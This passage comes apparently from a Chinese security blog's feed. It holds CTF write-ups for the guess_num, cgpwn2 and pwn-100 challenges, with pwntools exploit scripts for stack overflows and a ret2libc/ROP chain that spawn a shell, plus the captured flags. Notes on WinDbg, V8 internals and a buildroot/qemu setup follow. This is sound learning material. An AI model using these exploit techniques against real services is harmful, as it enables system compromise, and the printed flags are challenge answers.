class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">'username:'</span>)<br><span class="hljs-keyword">sh</span>.sendline(<span class="hljs-string">'z'</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">'passwd:'</span>)<br>payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0</span>x14+<span class="hljs-string">'aaaa'</span>+p32(flag)+<span class="hljs-string">'a'</span>*<span class="hljs-number">234</span><br><span class="hljs-keyword">sh</span>.sendline(payload)<br><span class="hljs-keyword">sh</span>.interactive()<br></code></pre></td></tr></tbody></table></figure><p>cyberpeace{2a2d92a084e034be9c3a03bbab4f149b}</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 guess_num</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/</url>
    
    <content type="html"><![CDATA[<p>查看关键main()函数，发现gets(&amp;v11)存在栈溢出</p><p><img src="https://i.loli.net/2020/05/08/9dWjqTSBtmRkHgG.png" alt="17627983-c6ff7c8db83a9ec7.png"></p><p>进入sub_C3E()函数，确定满足条件即可cat flag。</p><p><img src="https://i.loli.net/2020/05/08/QgLDtJBZlhXYyFa.png" alt="17627983-1e961fbba4dff1bc.png"></p><p>题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。</p><blockquote><p>注：<br>（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，rand()在调用的时候会自动设为1.<br>（2）libc共享库：可以使用命令 ldd guess_num 查找<br>（3）如何在脚本中调用动态库中的程序：python库ctypes模块，使用cdll.LoadLibrary(‘’)<br>(4)什么情况程序在编译前加载了动态库：比如我们在使用print家族、puts等未在程序里声明的函数，需要通过引用动态库里面就有程序不用声明就能进行调用的函数。</p></blockquote><p>exp:</p><p><img src="https://i.loli.net/2020/05/08/hltLr1UKMu6qmcG.png" alt="17627983-82da413e439821bd.png"></p><blockquote><p>解释：<br>引入pwn、ctypes模块；<br>remote连接其他主机服务；<br>elf=ELF(bin路径)本地运行pwn文件；<br>libc调用动态库;构造payload,随机数a覆盖到seed[0],设定随机数种子为1；<br>recvuntil()接收字符串；<br>sendline(payload)发送payload；<br>srand(1)设定随机数种子为1；<br>循环十次；<br>interactive()直接进行交互；</p></blockquote><p><img src="https://i.loli.net/2020/05/08/UXbv96WNxFriu3k.png" alt="17627983-caa9a4e5b8ce9f1a.png"></p><p>另一种方式：利用C程序，直接覆盖seed,爆出随机数，得到flag.</p><p><img src="https://i.loli.net/2020/05/08/LoDke3q2xhGSPHU.png" alt="17627983-93fb0ad7c552854b.png"></p><p><img src="https://s1.ax1x.com/2020/05/08/YnNVrd.png" alt="YnNVrd.png"></p><p><img src="https://s1.ax1x.com/2020/05/08/YnNMPf.png" alt="YnNMPf.png"></p><p>cyberpeace{c89cf2a54c56f16458a1164851a361b4}</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 cgpwn2</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/</url>
    
    <content type="html"><![CDATA[<p>算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。</p><p>name是全局变量，在bss区段，适合写入。</p><p>pwn()函数中调用了__system，但并没有‘/bin/sh’</p><p><img src="https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png" alt="17627983-d0f4027f425eadcd.png"></p><p><img src="https://i.loli.net/2020/05/08/QPL4xp8Wws1DJUc.png" alt="17627983-8f37fec1f7e9fab3.png"></p><p><img src="https://i.loli.net/2020/05/08/abOyYLf9FERVqvZ.png" alt="17627983-a19abf21a8c9c0f7.png"></p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>在name中写入’/bin/sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。</p><p>payload=填充栈+覆盖保存的exp的值4字节+假的返回地址call __system(‘/bin/sh’)</p><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> # p = process(<span class="hljs-string">'./cgpwn2'</span>)<br>p = remote(<span class="hljs-string">"111.198.29.45"</span>,<span class="hljs-number">32966</span>)<br>system_addr = <span class="hljs-number">0x804855A</span><br>bss_addr = <span class="hljs-number">0x804A080</span><br>p.recvuntil(<span class="hljs-string">'name\n'</span>)<br>p.sendline(<span class="hljs-string">"/bin/sh\x00"</span>)<br>p.recvuntil(<span class="hljs-string">'here:\n'</span>)<br>payload = <span class="hljs-number">0x26</span>*<span class="hljs-string">'a'</span> +<span class="hljs-string">'bbbb'</span>+ p32(system_addr) + p32(bss_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></tbody></table></figure><p>cyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界pwn-100</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/</url>
    
    <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查壳：checksec</p><p><img src="https://i.loli.net/2020/05/31/mfOTnUiRdaMHtGE.png" alt="查壳.PNG"></p><p>64位，无stack,无PIE；</p><p><img src="https://i.loli.net/2020/05/31/sHDG4fSe6xELluo.png" alt="1.PNG"></p><p>运行程序，输入字符，无反馈，无限制。</p><p><img src="https://i.loli.net/2020/05/31/axJ5bmchdIwRsfM.png" alt="漏洞.PNG"></p><p><img src="https://i.loli.net/2020/05/31/VCymAtHUqB7Pbei.png" alt="漏洞2.PNG"></p><p>ida查看main函数，发现存在栈溢出，参数a1大小为0x40.然而函数中获取大于等于a2（a2=200）的数值存入了a1.</p><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>无system函数，无/bin/sh字符串，有read,puts。参数经过寄存器传递（也可IDA查看），可以泄露libc,写入/bin/sh。</p><p><img src="https://i.loli.net/2020/05/31/wnf1YmoagvHcM2k.png" alt="寄存器传参.PNG"></p><p><img src="https://i.loli.net/2020/05/31/CrYc9oJgkWzthG2.png" alt="IDA查看寄存器.PNG"></p><p>puts只需要一个参数。寄存器rdi存放写入地址，rsi存放写入字节数。找到pop rdi;ret传参，即</p><p><code>pop rdi; ret</code><br><code>pop rsi; pop r15; ret</code></p><p><img src="https://i.loli.net/2020/05/31/c1NEeWTBvPy4OXj.png" alt="通过pop控制写入.PNG"></p><blockquote><p>注：调用read函数时，x86中参数直接放入栈中；x64设立了几个寄存器存放参数，调用函数时先向寄存器中放参数，当参数数量大于寄存器，才会像栈中放参数<br>传参顺序默认从后先开始传入。x86 x64一样。</p></blockquote><p>此处需要学习利用寄存器传递参数。</p><blockquote><p>关于pwntools的DynELF，主要功能是通过不断传入默认的函数地址到自己写的leak函数内部，测试并获取libc版本，得到函数地址。又因为DynELF无法搜索字符串地址，所以我们需要传入所需字符串，在调用函数加载bash。</p></blockquote><p>由于需要不断传参测试，加载程序后libc地址都会变化，可以重置程序解决问题。</p><p>初始化之后相当于一个新的程序，栈空间从新分配。此程序初始化段：</p><p><img src="https://i.loli.net/2020/05/31/EDtReszWUadf94H.png" alt="初始化.PNG"></p><blockquote><p>程序还需调用一个gadget,后续另起一篇学习</p></blockquote><p><img src="https://i.loli.net/2020/05/31/Kkm4sFIlzySxPZt.png" alt="gadget.PNG"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs #!usr/bin/python"> #coding=utf-8<br>from pwn import *<br> # context.log_level = 'debug'<br>io = remote('124.126.19.106',46612)<br> # io = process("./pwn-100")<br>elf = ELF("./pwn-100")<br>rop1 = 0x40075A #pop rbx_rbp_r12_r13_r14_r15<br>rop2 = 0x400740 #rdx(r13), rsi(r14), edi(r15d)<br>pop_rdi_ret = 0x400763<br> # start_addr = elf.symbols['_start']<br>start_addr = 0x400550<br>puts_plt = elf.plt['puts']<br>read_got = elf.got['read']<br>binsh_addr = 0x601000<br>def leak(addr):<br>  payload = "a" * 0x48 + p64(pop_rdi_ret) + p64(addr) + p64(puts_plt) + p64(start_addr)<br>  payload = payload.ljust(200, "a")<br>  io.send(payload)<br>  io.recvuntil("bye~\n")<br>  up = ""<br>  content = ""<br>  count = 0<br>  while True:<br>    c = io.recv(numb=1, timeout=0.5)<br>    count += 1<br>    if up == '\n' and c == "":<br>        content = content[:-1] + '\x00'<br>        break<br>    else:<br>        content += c<br>        up = c<br>  content = content[:4]<br>  log.info("%#x =&gt; %s" % (addr, (content or '').encode('hex')))<br>  return content<br>d = DynELF(leak, elf = elf)<br>sys_addr = d.lookup('system', 'libc')<br>log.info("system_addr =&gt; %#x", sys_addr)<br>payload  = "a" * 0x48 + p64(rop1) + p64(0) + p64(1) + p64(read_got) + p64(8) + p64(binsh_addr) + p64(1)<br>payload += p64(rop2)<br>payload += "\x00" * 56  <br>payload += p64(start_addr)<br>payload  = payload.ljust(200, "a")<br>io.send(payload)<br>io.recvuntil("bye~\n")<br> # gdb.attach(io)<br>io.send("/bin/sh\x00")<br>payload = "a" * 0x48 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(sys_addr)<br>payload = payload.ljust(200, "a")<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WinDbg使用整理</title>
    <link href="/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/"/>
    <url>/2022/08/09/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-基础命令"><a href="#0x00-基础命令" class="headerlink" title="0x00 基础命令"></a>0x00 基础命令</h2><ul><li>.sympath　　//显示设置的符号表路径</li><li>.reload　　　　//此命令主要用于加载符号表。</li><li>.reload /f　　//重新装载模块</li><li>.reload /i　　//强制加载mismatched symbol</li><li>U　　//这个命令主要用于反汇编某个地址，其后面可以跟函数名和地址。U命令后面可以加L表示延长反汇编长度</li><li>db　　//显示一字节的长度。</li><li>dw　　//显示两字节的长度。</li><li>dd　　//显示四字节的长度。</li><li>dq　　//显示八字节的长度。</li><li>dD　　//显示double实数(8字节的长度)。</li><li>df　　//显示float实数(4字节的长度)。</li><li>da     //显示asscii值</li><li>du     //显示unicode值</li><li>ds     //显示ANI_STRING值</li><li>dS     //显示UNICODE_STRING的值</li><li>eb address value　　//在address 这个地址写入一个字节value</li><li>ew address value　　//在address 这个地址写入两字节value</li><li>ed address value　　//在address 这个地址写入四字节字节value</li><li>eq address value　　//在address 这个地址写入八字节字节value</li></ul><h2 id="0x01-对象相关命令"><a href="#0x01-对象相关命令" class="headerlink" title="0x01 对象相关命令"></a>0x01 对象相关命令</h2><ul><li>dt　　//dt命令主要用于查看结构体。</li><li>lm　　//列出模块。</li><li>lm vm 模块名　　//查看模块详细信息。 </li><li>!process 0 0 　　　　//列出系统进程信息</li><li>!process 0 0 进程名  //列出该进程的信息</li><li>!process 0 1 进程名  //列出该进程更加的信息</li><li>!process 0 7 进程名  //列出该进程的详细信息，包括线程的</li><li>.process EPROCESS　　//切入该进程中</li><li>!object 地址　　//显示该地址的对象信息。</li><li>bp address  //在地址address插入断点。</li><li>ba命令是是硬件断点命令，通过设置cpu的dx寄存器来拦截线程。</li><li>ba access size 地址　　//access 是访问的方式，比如 e (执行)，r (读/写)，w (写) ，size是监控访问的位置 的大小，以字节为单位。值 为 1、2或4，在64位机器上还可以是8。</li><li>bd/be/bc</li><li>bd 断点号 //此命令是关闭断点号所对应的断点 。</li><li>be 断点号 //此命令是开启断点号所对应的断点 。</li><li>bc *　　　//去除所有断点。</li><li>x   //x命令用来模糊查询</li><li>x nt!kes<em>des</em>table*   //样查看SSDT表的地址</li><li>dds 地址 //此命令用来解析某连续地址的函数名。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>V8漏洞初学习</title>
    <link href="/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/08/09/V8%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="V8基础"><a href="#V8基础" class="headerlink" title="V8基础"></a>V8基础</h1><p>v8是chrome浏览器的js解析引擎，大多数针对chrome的漏洞利用几乎都是v8引擎引起的</p><blockquote><p>v8编译后二进制名称叫d8.</p></blockquote><h2 id="allow-natives-syntax选项"><a href="#allow-natives-syntax选项" class="headerlink" title="allow-natives-syntax选项"></a>allow-natives-syntax选项</h2><p>定义了一些v8运行时支持函数，以便于本地调试：</p><figure class="highlight prolog"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs prolog">browser/x64.release$ ./d8 --allow-natives-syntax<br><span class="hljs-symbol">V8</span> version <span class="hljs-number">7.5</span><span class="hljs-number">.0</span> (candidate)<br>d8&gt; var a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];<br>undefined<br>d8&gt; <span class="hljs-comment">%DebugPrint(a);</span><br><span class="hljs-number">0x2ebcfb54dd41</span> &lt;<span class="hljs-symbol">JSArray</span>[<span class="hljs-number">3</span>]&gt;<br>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>d8&gt; <span class="hljs-comment">%SystemBreak();</span><br><span class="hljs-symbol">Trace</span>/breakpoint trap (core dumped)<br></code></pre></td></tr></tbody></table></figure><p>在加载d8时加入此选项可以在js中调试本地运行时函数：</p><p><code>%DebugPrint(obj) 输出对象地址</code><br><code>%SystemBreak() 触发调试中断主要结合gdb等调试器使用</code></p><p>gdb的gdbinit脚本可以使gdb中就能可视化显示v8的对象结构，将该脚本下载重命名为gdbinit_v8并添加至/.gdbinit脚本：</p><p><code>source /path/to/gdbinit_v8</code></p><p>下面将allow-natives-syntax选项和gdbinit结合使用，编写test.js：</p><figure class="highlight haml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs haml">var a = [1,2,3];<br>var b = [1.1, 2.2, 3.3];<br>var c = [a, b];<br><span class="hljs-tag">%<span class="hljs-selector-tag">DebugPrint</span>(a)</span>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">SystemBreak</span>()</span>;  //触发第一次调试<br><span class="hljs-tag">%<span class="hljs-selector-tag">DebugPrint</span>(b)</span>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">SystemBreak</span>()</span>;  //触发第二次调试<br><span class="hljs-tag">%<span class="hljs-selector-tag">DebugPrint</span>(c)</span>;<br><span class="hljs-tag">%<span class="hljs-selector-tag">SystemBreak</span>()</span>;  //触发第三次调试<br></code></pre></td></tr></tbody></table></figure><p>gdb运行d8:</p><figure class="highlight elixir"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@kali</span><span class="hljs-symbol">:~/ctf/browser/x64</span>.release<span class="hljs-variable">$ </span>gdb ./d8<br>pwndbg&gt; set args --allow-natives-syntax ./test.js<br>pwndbg&gt; r<br><span class="hljs-title class_">Starting</span> <span class="hljs-symbol">program:</span> x64.release/d8 --allow-natives-syntax ./test.js<br>[<span class="hljs-title class_">Thread</span> debugging using libthread_db enabled]<br>[<span class="hljs-title class_">New</span> <span class="hljs-title class_">Thread</span> <span class="hljs-number">0x7ff87fde9700</span> (<span class="hljs-title class_">LWP</span> <span class="hljs-number">18393</span>)]<br>[<span class="hljs-title class_">New</span> <span class="hljs-title class_">Thread</span> <span class="hljs-number">0x7ff87f5e8700</span> (<span class="hljs-title class_">LWP</span> <span class="hljs-number">18394</span>)]<br>[<span class="hljs-title class_">New</span> <span class="hljs-title class_">Thread</span> <span class="hljs-number">0x7ff87ede7700</span> (<span class="hljs-title class_">LWP</span> <span class="hljs-number">18395</span>)]<br><span class="hljs-number">0x12e891f8df11</span> &lt;<span class="hljs-title class_">JSArray</span>[<span class="hljs-number">3</span>]&gt;            <br></code></pre></td></tr></tbody></table></figure><p>可以发现，程序打印了数组对象a的内存地址，并且SystemBreak触发了gdb的中断。</p><p>此时就可以利用上面已经加入的gdbinit脚本中包含的命令调试对象结构，主要使用job命令，可以可视化显示js对象的内存结构。</p><p>v8在内存中只有数字和对象梁忠表示，为了区分两者，v8在所有对象的内存地址末尾都加了1，以便表示它是个对象。对象a世内存地址为0x12e891f8df10。</p><p>telescope命令查看内存数据。</p><p>在gdb中使用c命令继续运行，发现停在了第二次SystemBreak的地方，然后用job命令查看第二个对象b的地址，根据上面的套路，可知对象b的实际内存地址为0x244de278df58.</p><h2 id="v8的对象结构"><a href="#v8的对象结构" class="headerlink" title="v8的对象结构"></a>v8的对象结构</h2><p>和vb等语言的解析类似，JS是一种解释之行语言，v8本质上是一个JS的解释执行程序。</p><p>首先，需要了解v8解析执行javaScript语句的基本流程：v8在读取js语句后，首先将这条语句解析为语法树，然后通过解释器将语法树变为中间语言的Bytecode字节码，最后利用内部虚拟机将字节码转换为机器码来执行。</p><p>为了加快解析过程，v8会记录下某条语法树的执行次数，当v8发现某条语法树执行次数超过一定阈值后，就会将这段语法树直接转换为机器码，后续再调用这条js语句时，v8会直接调用这条语法树对应的机器码，而不用再转换为byte code字节码，大大加快了执行速度，这就是著名的JIT优化。</p><p>但是这样的性能优化虽然加快了程序的执行，但也带来了很多的安全问题，如果v8本来通过JIT引擎为某段语法树比如a+b假发计算生成了一段机器码<code>add eax,ebx</code>，而在后续某个时刻，攻击者在js引擎中突然改变了a和b的对象类型，而JIT引擎并没有识别出这个改变，就会造成a和b对象在假发运算时的类型混淆。</p><p>一个对象在内存中布局大致如下：</p><ul><li>map:表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型</li><li>prototype：prototype</li><li>elements:对象元素</li><li>length:元素个数</li><li>properties:属性</li></ul><p>数组对象的elements其实也是个对象，这些元素在内存中的分布正好位于数组对象的上方，即低地址处，也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储这个数组的对象结构，对象中的elements指向了存储元素内容的内存地址，如图：</p><p><img src="https://i.loli.net/2020/07/17/JCK5EwuRAc8SQTn.png" alt="1.PNG"></p><p>由于浏览器的漏洞利用几乎都要基于对象结构来实现，因此熟悉上述v8对象的内存布局，对后续会很有帮助。</p><blockquote><p>上述内存布局是FloatArray的内存布局，其他类型的Array与其类似，但不完全相同。</p></blockquote><h2 id="浏览器V8的解题步骤"><a href="#浏览器V8的解题步骤" class="headerlink" title="浏览器V8的解题步骤"></a>浏览器V8的解题步骤</h2><p>一般浏览器的出题有两种，以中山市diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。出题者通常会提供一个idf文件，或直接给出一个编译后diff补丁后的浏览器程序，如果只给了一个diff文件，则需要我们自己去下载相关commit源码，然后本地打上diff补丁，编译出浏览器程序在进行本地调试。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.codercto.com/a/81538.html">https://www.codercto.com/a/81538.html</a></p><p>后续需要实践做一下这个ctf题目。</p>]]></content>
    
    
    
    <tags>
      
      <tag>chrome_bug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu下buildroot以及qemu环境搭建</title>
    <link href="/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/08/09/Ubuntu%E4%B8%8Bbuildroot%E4%BB%A5%E5%8F%8Aqemu%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-搭建环境"><a href="#0x00-搭建环境" class="headerlink" title="0x00 搭建环境"></a>0x00 搭建环境</h1><p>windows 10<br>VMwareWorkstation pro<br>Ubuntu 16.04 x64</p><h1 id="0x01-安装binwalk"><a href="#0x01-安装binwalk" class="headerlink" title="0x01 安装binwalk"></a>0x01 安装binwalk</h1><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo su<br>sudo apt-<span class="hljs-built_in">get</span> <span class="hljs-built_in">remove</span> binwalk<br>sudo spt-<span class="hljs-built_in">get</span> <span class="hljs-keyword">update</span><br>sudo apt-<span class="hljs-built_in">get</span> install build-essential autoconf git //获取Git<br>git clone https://github.<span class="hljs-keyword">com</span>/devttys0/binwalk<br><span class="hljs-keyword">cd</span> binwalk<br>sudo <span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> install<br>sudo ./deps.<span class="hljs-keyword">sh</span><br></code></pre></td></tr></tbody></table></figure><h1 id="0x02-安装buildroot交叉编译环境"><a href="#0x02-安装buildroot交叉编译环境" class="headerlink" title="0x02 安装buildroot交叉编译环境"></a>0x02 安装buildroot交叉编译环境</h1><p>安装依赖：</p><p><code>sudo apt-get install libncurses5-dev patch</code></p><p>下载buildroot:</p><p><code>wget https://buildroot.org/downloads/buildroot-2020.02.6.tar.gz </code></p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxvf buildroot-<span class="hljs-number">2020</span>.<span class="hljs-number">02</span>.<span class="hljs-number">6</span>.tar.gz<br><span class="hljs-attribute">cd</span> buildroot-<span class="hljs-number">2020</span>.<span class="hljs-number">02</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">make</span> clean<br><span class="hljs-attribute">make</span> menuconfig<br></code></pre></td></tr></tbody></table></figure><p>出现配置界面：</p><ul><li>选择target options-&gt;target Architecture-&gt;MIPS(Little endian),代表MIPS小端序</li><li>在toolChain–&gt;Kelnel Headers,选择自己主机内核版本或更低版本。</li><li>保存退出</li></ul><p><code>sudo make</code></p><p>静等完成。</p><p>os：编译的时候需要大内存，我分配个虚拟机的内存太小，导致编译失败了好几次……此处多谢Prowes5帮我找到了原因呜呜呜。</p><p>测试：</p><figure class="highlight jboss-cli"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./mipsel-linux-gcc</span> hello.c -o hello<br><span class="hljs-string">./hello</span> <span class="hljs-string">//</span>失败<br></code></pre></td></tr></tbody></table></figure><p>使用file查看，是小端序的mips程序。</p><h1 id="0x03-qemu运行环境"><a href="#0x03-qemu运行环境" class="headerlink" title="0x03 qemu运行环境"></a>0x03 qemu运行环境</h1><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install qemu<br>sudo apt-<span class="hljs-built_in">get</span> install qemu-user-static<br></code></pre></td></tr></tbody></table></figure><p>测试hello报错<code>/lib/ld-uClibc.so.0: No such file or directory</code></p><p>是因为没有对应架构的链接库的问题<br>在目录output/host/mipsel-buildroot-linux-uclibc/sysroot/lib/下，</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> cp ld-uClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span>.so /lib/<br><span class="hljs-attribute">sudo</span> chown -R root:root /lib/ld-uClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">31</span>.so<br><span class="hljs-attribute">sudo</span> ln -s /lib/ld-uClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span>.so /lib/ld-uClibc.so.<span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure><p>还是不行，cd /lib目录下，删掉了原来的ld-uClibc.so.0文件，然后重新输入命令。</p><p>出现新报错：<code>/home/test/buildroot-2019.02.4/hello: can't load library 'libc.so.0'</code></p><p>解决方案：</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> cp libuClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">31</span>.so /lib/<br><span class="hljs-attribute">sudo</span> chown -R root:root /lib/libuClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span>.so<br><span class="hljs-attribute">sudo</span> ln -s /lib/libuClibc-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">32</span>.so /lib/libc.so.<span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure><p>还是出现了文件不对应问题，cd /lib下删掉了原来的libc.so.0文件，继续重新输入命令。</p><p>运行成功。</p><p>os:为了找到出错点，我真是已经切换目录切换到全都背下来了……真的是一搭环境总会碰到所有的问题……霉霉本霉了。</p><h1 id="0x04-配置网络环境"><a href="#0x04-配置网络环境" class="headerlink" title="0x04 配置网络环境"></a>0x04 配置网络环境</h1>]]></content>
    
    
    
    <tags>
      
      <tag>IOT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pikachu漏洞练习记录1</title>
    <link href="/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/"/>
    <url>/2022/08/09/pikachu%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A01/</url>
    
